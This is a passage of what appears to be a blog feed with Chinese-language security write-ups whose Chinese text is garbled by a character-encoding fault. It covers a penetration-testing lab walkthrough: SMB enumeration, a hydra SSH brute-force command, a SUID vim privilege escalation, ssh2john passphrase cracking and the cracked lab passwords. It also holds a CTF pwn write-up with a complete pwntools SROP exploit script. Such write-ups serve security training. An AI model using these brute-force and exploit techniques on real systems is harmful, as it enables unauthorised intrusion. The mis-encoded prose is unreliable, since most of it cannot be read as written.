      <link href="/2023/12/31/Basic%20Pentesting/"/>
      <url>/2023/12/31/Basic%20Pentesting/</url>
      
        <content type="html"><![CDATA[<h1 id="æ¢æµ‹"><a href="#æ¢æµ‹" class="headerlink" title="æ¢æµ‹"></a>æ¢æµ‹</h1><p>nmapæ¢æµ‹æœåŠ¡ï¼Œæ˜¯Linux ubuntuæœåŠ¡å™¨ï¼Œ80ç«¯å£è¿è¡ŒwebæœåŠ¡ã€‚åŒæ—¶æ³¨æ„åˆ°åœ¨139&#x2F;445ç«¯å£è¿è¡Œäº†SMBæœåŠ¡ï¼Œåœ¨22å¼€å¯äº†sshæœåŠ¡<br><img src="/Red_FILE/37977293cad8d613d38f9e628a3f706c_MD5.jpeg"><br>çˆ†ä¸€ä¸‹ç›®å½•çœ‹çœ‹<br><img src="/Red_FILE/dc85e7a63f38695808d8ff0a062fbbd2_MD5.jpeg"><br>å‘ç°å¯ç–‘ç›®å½•<br><img src="/Red_FILE/Pasted%20image%2020240629235050.png"><br>çœ‹ä¸€ä¸‹å…¶ä¸­çš„å†…å®¹ï¼š</p><pre class="line-numbers language-text" data-language="text"><div class="caption"><span>TI:"dev.txt"</span></div><code class="language-text">2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neatto host that on this server too. Haven't made any real web apps yet, but I have tried that exampleyou get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm using version 2.5.12, because other versions were giving me trouble. -K2018-04-22: SMB has been configured. -K2018-04-21: I got Apache set up. Will put in our content later. -J2018å¹´4æœˆ23æ—¥ï¼šæˆ‘ä¸€ç›´åœ¨æé‚£ä¸ªstrutsçš„ä¸œè¥¿ï¼Œå®ƒéå¸¸é…·ï¼æˆ‘è®¤ä¸ºåœ¨è¿™ä¸ªæœåŠ¡å™¨ä¸Šæ‰˜ç®¡å®ƒå¯èƒ½ä¼šå¾ˆæœ‰è¶£ã€‚æˆ‘è¿˜æ²¡æœ‰åˆ¶ä½œè¿‡çœŸæ­£çš„Webåº”ç”¨ç¨‹åºï¼Œä½†æˆ‘å·²ç»å°è¯•è¿‡ä½ å¯ä»¥å±•ç¤ºå®ƒå¦‚ä½•å·¥ä½œçš„ç¤ºä¾‹ï¼ˆå®ƒæ˜¯ç¤ºä¾‹çš„RESTç‰ˆæœ¬ï¼ï¼‰ã€‚å“¦ï¼Œç°åœ¨æˆ‘æ­£åœ¨ä½¿ç”¨2.5.12ç‰ˆæœ¬ï¼Œå› ä¸ºå…¶ä»–ç‰ˆæœ¬ç»™æˆ‘å¸¦æ¥äº†éº»çƒ¦ã€‚-K2018å¹´4æœˆ22æ—¥ï¼šSMBå·²é…ç½®ã€‚-K2018å¹´4æœˆ21æ—¥ï¼šæˆ‘å·²ç»è®¾ç½®å¥½äº†Apacheã€‚ç¨åå°†æ”¾å…¥æˆ‘ä»¬çš„å†…å®¹ã€‚-J<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-text" data-language="text"><div class="caption"><span>TI:"j.txt"</span></div><code class="language-text">For J:I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,and I was able to crack your hash really easily. You know our password policy, so please followit? Change that password ASAP.-Kå¯¹Jï¼šæˆ‘ä¸€ç›´åœ¨å®¡è®¡/etc/shadowçš„å†…å®¹ï¼Œä»¥ç¡®ä¿æˆ‘ä»¬æ²¡æœ‰ä»»ä½•å¼±å‡­æ®ï¼Œæˆ‘å¾ˆå®¹æ˜“ç ´è§£äº†ä½ çš„å“ˆå¸Œã€‚ä½ çŸ¥é“æˆ‘ä»¬çš„å¯†ç ç­–ç•¥ï¼Œè¯·éµå¾ªå®ƒï¼Ÿå°½å¿«æ›´æ”¹å¯†ç ã€‚-K<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä»ä¿¡æ¯ä¸­å¯è§é…ç½®äº†SMBæœåŠ¡ï¼Œå¹¶ä¸”å­˜åœ¨å¼±å£ä»¤é—®é¢˜</p><h1 id="å…¥ä¾µ"><a href="#å…¥ä¾µ" class="headerlink" title="å…¥ä¾µ"></a>å…¥ä¾µ</h1><p>å…ˆä¸Šenum4linuxæ¢æµ‹ï¼Œå‘ç°äº†ä»¥ä¸‹æœ‰æ•ˆçš„ä¿¡æ¯<br><img src="/Red_FILE/ec82945198d0f9add9dbe2ae6de13b57_MD5.jpeg"><br>å°è¯•åŒ¿åç™»å½•ï¼ŒæˆåŠŸ<br><img src="/Red_FILE/368e4912caaf68395bd2a129b777a0d9_MD5.jpeg"><br>çœ‹ä¸€ä¸‹staff.txt</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">Announcement to staff:PLEASE do not upload non-work-related items to this share. I know it's all in fun, butthis is how mistakes happen. (This means you too, Jan!)-Kayè¯·ä¸è¦ä¸Šä¼ ä¸å·¥ä½œæ— å…³çš„å†…å®¹åˆ°æ­¤å…±äº«æ–‡ä»¶å¤¹ã€‚æˆ‘çŸ¥é“è¿™å¾ˆæœ‰è¶£ï¼Œä½†è¿™å°±æ˜¯é”™è¯¯å‘ç”Ÿçš„åŸå› ã€‚ ï¼ˆè¿™ä¹Ÿé€‚ç”¨äºä½ ï¼ŒJanï¼ï¼‰-Kay<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æˆ‘ä»¬å¾—çŸ¥äº†è¯¥ç”¨æˆ·æ˜¯Jan</p><p>ä»å‰é¢å¾—çŸ¥ï¼ŒJçš„å¯†ç å­˜åœ¨å¼±å£ä»¤é—®é¢˜ï¼Œæˆ‘ä»¬å¯èƒ½é€šè¿‡çˆ†ç ´sshå¯†ç æ¥ç™»å½•æœåŠ¡å™¨<br><code>hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.76.117</code><br>çˆ†äº†6åˆ†é’Ÿï¼ŒæˆåŠŸçˆ†ç ´å‡ºå¯†ç ï¼šjan : armando</p><p><img src="/Red_FILE/7296a83bf6f275e3a539d1a074951844_MD5.jpeg">æ¥ç€sshç™»å½•Jançš„è´¦æˆ·ï¼Œå¯è§è¿˜æœ‰å¦ä¸€ä¸ªç”¨æˆ·æ˜¯kayï¼Œå…¶ä¸‹æœ‰ä¸€ä¸ªå¯ç–‘å¤‡ä»½æ–‡ä»¶ï¼Œéœ€è¦rootæ‰“å¼€<br><img src="/Red_FILE/1660569a7ec2c28bd82f3988bc41bbeb_MD5.jpeg"><br><img src="/Red_FILE/13e2bdf6e29c8af38282786c907fd7fd_MD5.jpeg"></p><h1 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h1><h2 id="æ³•ä¸€"><a href="#æ³•ä¸€" class="headerlink" title="æ³•ä¸€"></a>æ³•ä¸€</h2><p>ä½¿ç”¨pythonä½œä¸ºä¸€ä¸ªç®€å•çš„æœåŠ¡å™¨ä¸Šä¼ LinEnum.shï¼Œä»¥å¯»æ‰¾æˆ‘ä»¬å¯ç”¨çš„ä¿¡æ¯</p><p>æ³¨æ„ï¼šæˆ‘ä»¬äº‹å…ˆè½¬å…¥&#x2F;tmpï¼Œå› ä¸ºä»»ä½•ç”¨æˆ·éƒ½å¯ä»¥å†™å…¥æ­¤æ–‡ä»¶å¤¹<br><img src="/Red_FILE/719e77b065f8d94cf2787df19d8135de_MD5.jpeg"><br>chmod +xåè¿è¡Œ</p><p>æœé›†åˆ°ä¸€äº›æœ‰ç”¨çš„ä¿¡æ¯ï¼š</p><ul><li>kayæ˜¯ç®¡ç†å‘˜<br><img src="/Red_FILE/042d873aa66ff957676685fc95f18c88_MD5.jpeg"></li><li>æˆ‘ä»¬èƒ½å¤ŸæŸ¥çœ‹&#x2F;etc&#x2F;passwdï¼Œä¸èƒ½æŸ¥çœ‹&#x2F;etc&#x2F;shadow<br><img src="/Red_FILE/65d2cb63296e2d024008929746d8e1a4_MD5.jpeg"></li><li>å¯ç–‘SUIDæ–‡ä»¶ï¼š&#x2F;usr&#x2F;bin&#x2F;vim.basic<br><img src="/Red_FILE/67b26098cfaf5890c4e2680a083908e0_MD5.jpeg"></li><li>æˆ‘ä»¬å¯ä»¥ç›´æ¥åˆ©ç”¨vim.basicä»¥rootæ‰“å¼€å¤‡ä»½æ–‡ä»¶ï¼</li></ul><p>å¾—åˆ°è¿™æ ·ä¸€ä¸²å¯†ç ï¼š<code>heresareallystrongpasswordthatfollowsthepasswordpolicy$$</code></p><p>æˆåŠŸç™»å½•kayè´¦æˆ·ï¼<br><img src="/Red_FILE/97d5da5de4c045b1c9aad9ee61a98822_MD5.jpeg"></p><h2 id="æ³•äºŒ"><a href="#æ³•äºŒ" class="headerlink" title="æ³•äºŒ"></a>æ³•äºŒ</h2><p>æˆ‘ä»¬æ³¨æ„åˆ°&#x2F;home&#x2F;kayç›®å½•ä¸‹æœ‰ä¸€ä¸ª.sshæ–‡ä»¶å¤¹ï¼Œå…¶ä¸‹å­˜æ”¾ç€ kay è´¦æˆ·çš„sshå…¬é’¥å’Œç§é’¥<br><img src="/Red_FILE/97d5da5de4c045b1c9aad9ee61a98822_MD5.jpeg"><br>å°†å…¶å¤åˆ¶åˆ°æœ¬åœ°ï¼Œchmod 600</p><p>å°è¯•ä½¿ç”¨ç§é’¥æ¥sshè¿æ¥kayè´¦æˆ·ï¼Œä½†ä¸å¹¸çš„æ˜¯éœ€è¦è¾“å…¥key passphraseï¼š<br><img src="/Red_FILE/ecb9eb5a3fdddf886c2a91b41c1a2508_MD5.jpeg"></p><blockquote><p>å¯†é’¥ç™»å½•ç®€å•è¯´æ˜¯æˆ‘ä»¬ç”Ÿæˆä¸€ä¸ªå¯†é’¥å¯¹ï¼ˆå…¬é’¥ä¸ç§é’¥ï¼‰ï¼Œæ¥ç€æˆ‘ä»¬æŠŠå…¬é’¥æ”¾åˆ°ç›®æ ‡æœåŠ¡å™¨ä¸Šï¼Œç„¶åç”¨å¯†é’¥å»ç™»å½•ç›®æ ‡æœåŠ¡å™¨ã€‚<br>ç§é’¥çš„å¯†ç ï¼ˆpassphraseï¼‰æ˜¯æˆ‘ä»¬åœ¨ç”Ÿæˆå¯†é’¥å¯¹çš„æ—¶å€™æœ‰æœºä¼šå»è®¾ç½®ï¼Œè¿™ä¸ªè®¾ç½®æ˜¯å¯é€‰é¡¹æ¥ç€ã€‚ä¸€èˆ¬åŸºäºå®‰å…¨è€ƒè™‘æœ€å¥½æ˜¯è®¾ç½®ï¼Œå½“ç»™ç§é’¥è®¾ç½®äº†å¯†ç ï¼Œç„¶åç”¨è¯¥ç§é’¥sshåˆ°ç›®æ ‡æœåŠ¡å™¨æ—¶ï¼Œç»ˆç«¯ä¼šæç¤ºä½ è¾“å…¥ç§é’¥çš„å¯†ç ã€‚å¦‚æœä¸æƒ³æ¯æ¬¡éƒ½è¾“å…¥ç§é’¥çš„å¯†ç ï¼Œæœ€ç®€å•æ˜¯ä¸ç”¨è®¾ç½®å¯†ç </p></blockquote><p><del>åˆ°è¿™é‡Œå¡ä½äº†ï¼Œçœ‹wpæ˜¯ä½¿ç”¨äº†ssh2johnæ¥è¿›è¡Œçˆ†ç ´ï¼Œç­‰åé¢å­¦åˆ°äº†å†è¡¥å­</del></p><p>ç”¨ssh2johnè½¬ä¸€ä¸‹æ ¼å¼ï¼Œå°è¯•ç ´è§£ä¸€ä¸‹hash<br><img src="/Red_FILE/f23acf630072bbb7893451cc095d97e5_MD5.jpeg"><br>ç ´è§£æˆåŠŸï¼è´¦æˆ·kay : beeswax<br><img src="/Red_FILE/99c8a037aff919998693d1d9afd71550_MD5.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> è¿›æ”»æ€§æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¸—é€æ‰“é¶ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023-çº¿ä¸Š-ç¬¬å…­å±Šå®‰æ´µæ¯</title>
      <link href="/2023/12/29/2023-%E7%BA%BF%E4%B8%8A-%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF/"/>
      <url>/2023/12/29/2023-%E7%BA%BF%E4%B8%8A-%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<p>æœ¬æ¬¡æ¯”èµ›æ’è¡Œç¬¬å…­<br><img src="/EXP_FILE/b99ab622882c34786e53bfba688023ea_MD5.jpeg"><br><img src="/EXP_FILE/29566ca0bd6298c9192873218fdc841d_MD5.jpeg"></p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="seccomp"><a href="#seccomp" class="headerlink" title="seccomp"></a>seccomp</h2><h3 id="ç¨‹åºåˆ†æ"><a href="#ç¨‹åºåˆ†æ" class="headerlink" title="ç¨‹åºåˆ†æ"></a>ç¨‹åºåˆ†æ</h3><p>æ²¡å¼€pieå’Œcanaryï¼Œå¼€äº†æ²™ç®±<br><img src="/EXP_FILE/bcef12d16a369a7916a4adc7ddfbb399_MD5.png"><br><img src="/EXP_FILE/a9367d34ff663d00ebf7f0f3280d7b2c_MD5.png"></p><p>æœ‰ä¸€ä¸ªæº¢å‡ºï¼Œæº¢å‡º0x10ï¼ŒåŒæ—¶å¯ä»¥åœ¨bssè¾“å…¥0x1000çš„æ•°æ®ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">sub_40136E</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> v1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+6h] [rbp-2Ah] BYREF</span>  _QWORD v2<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-20h] BYREF</span>  v2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'onk u oD'</span><span class="token punctuation">;</span>  v2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'i tahw w'</span><span class="token punctuation">;</span>  v2<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'\n?DIUS s'</span><span class="token punctuation">;</span>  <span class="token function">strcpy</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token string">"easyhack\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">syscall</span><span class="token punctuation">(</span><span class="token number">1LL</span><span class="token punctuation">,</span> <span class="token number">1LL</span><span class="token punctuation">,</span> v1<span class="token punctuation">,</span> <span class="token number">9LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment">// write(1,v1,0x9)</span>  <span class="token function">syscall</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>unk_404060<span class="token punctuation">,</span> <span class="token number">0x1000LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">// read(0, bss, 0x1000)</span>  <span class="token function">syscall</span><span class="token punctuation">(</span><span class="token number">1LL</span><span class="token punctuation">,</span> <span class="token number">1LL</span><span class="token punctuation">,</span> v2<span class="token punctuation">,</span> <span class="token number">0x18LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">// write(1,v2,0x18)</span>  <span class="token function">syscall</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> v1<span class="token punctuation">,</span> <span class="token number">0x3ALL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">// read(0,v1,0x3a)</span>  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰¾åˆ°gadgetï¼Œç›´æ¥æ ˆåŠ«æŒåˆ°bssï¼Œæ‰“sropçš„orwé“¾å­<br><img src="/EXP_FILE/c5fe6f52e40a301e54a0cfa7eb2fec0f_MD5.png"></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre class="line-numbers language-python" data-language="python"><div class="caption"><span>TI:"è‡ªå†™exp"</span></div><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment">#@Author:X1NRI</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#from LibcSearcher import LibcSearcher</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#dbg(None)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span>gdbscript<span class="token operator">=</span>command<span class="token punctuation">)</span><span class="token comment">#pause()</span><span class="token comment">#------------------------------------------------------------------</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>syscall_p_ret<span class="token operator">=</span><span class="token number">0x000000000040118a</span>sigreturn_ret<span class="token operator">=</span><span class="token number">0x0000000000401194</span>leave_ret<span class="token operator">=</span><span class="token number">0x000000000040136c</span>bss<span class="token operator">=</span><span class="token number">0x0000000000404060</span><span class="token comment">#------------open</span>sigframe_open <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>sigframe_open<span class="token punctuation">.</span>rax <span class="token operator">=</span> <span class="token number">2</span>sigframe_open<span class="token punctuation">.</span>rdi <span class="token operator">=</span> bss<span class="token operator">+</span><span class="token number">0x110</span> <span class="token comment">#flag_addr</span>sigframe_open<span class="token punctuation">.</span>rsi <span class="token operator">=</span> <span class="token number">0</span>sigframe_open<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">0</span>sigframe_open<span class="token punctuation">.</span>rsp <span class="token operator">=</span> bss<span class="token operator">+</span><span class="token number">0x200</span><span class="token operator">-</span><span class="token number">8</span>sigframe_open<span class="token punctuation">.</span>rip <span class="token operator">=</span> syscall_p_retpayload<span class="token operator">=</span>p64<span class="token punctuation">(</span>sigreturn_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>syscall_p_ret<span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>sigframe_open<span class="token punctuation">)</span>payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">b'./flag\x00\x00'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload<span class="token operator">=</span>payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token comment">#--------------read</span>sigframe_read <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>sigframe_read<span class="token punctuation">.</span>rax <span class="token operator">=</span> <span class="token number">0</span>sigframe_read<span class="token punctuation">.</span>rdi <span class="token operator">=</span> <span class="token number">3</span>sigframe_read<span class="token punctuation">.</span>rsi <span class="token operator">=</span> bss<span class="token operator">+</span><span class="token number">0x800</span>sigframe_read<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">0x100</span>sigframe_read<span class="token punctuation">.</span>rsp <span class="token operator">=</span> bss<span class="token operator">+</span><span class="token number">0x400</span><span class="token operator">-</span><span class="token number">8</span>sigframe_read<span class="token punctuation">.</span>rip <span class="token operator">=</span> syscall_p_retpayload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>sigreturn_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>syscall_p_ret<span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>sigframe_read<span class="token punctuation">)</span>payload<span class="token operator">=</span>payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x400</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token comment">#-------------write</span>sigframe_write <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>sigframe_write<span class="token punctuation">.</span>rax <span class="token operator">=</span> <span class="token number">1</span>sigframe_write<span class="token punctuation">.</span>rdi <span class="token operator">=</span> <span class="token number">1</span>sigframe_write<span class="token punctuation">.</span>rsi <span class="token operator">=</span> bss<span class="token operator">+</span><span class="token number">0x800</span>sigframe_write<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">0x100</span>sigframe_write<span class="token punctuation">.</span>rsp <span class="token operator">=</span> bss<span class="token operator">+</span><span class="token number">0x600</span><span class="token operator">-</span><span class="token number">8</span>sigframe_write<span class="token punctuation">.</span>rip <span class="token operator">=</span> syscall_p_retpayload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>sigreturn_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>syscall_p_ret<span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>sigframe_write<span class="token punctuation">)</span><span class="token comment">#--------------------------</span>sa<span class="token punctuation">(</span><span class="token string">'easyhack\n'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x2a</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bss<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span><span class="token comment">#dbg('b *0x40136d\nc\n')</span>sa<span class="token punctuation">(</span><span class="token string">'SUID?\n'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>itr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span><span class="token string">"splitw"</span><span class="token punctuation">,</span><span class="token string">"-h"</span><span class="token punctuation">]</span>binary<span class="token operator">=</span><span class="token string">'./chall'</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>libc<span class="token operator">=</span>elf<span class="token punctuation">.</span>libc<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>s  <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sl   <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sa   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sla  <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>r    <span class="token operator">=</span> <span class="token keyword">lambda</span> num      <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>num<span class="token punctuation">)</span>ru   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>DROP<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>data<span class="token punctuation">,</span>drop<span class="token operator">=</span>DROP<span class="token punctuation">)</span>rl  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>ep   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span>data<span class="token punctuation">]</span>eg   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>data<span class="token punctuation">]</span>es   <span class="token operator">=</span> <span class="token keyword">lambda</span> data       <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>ls   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>itr  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>ic   <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>pt   <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m %s --- %s \033[0m'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg   <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" 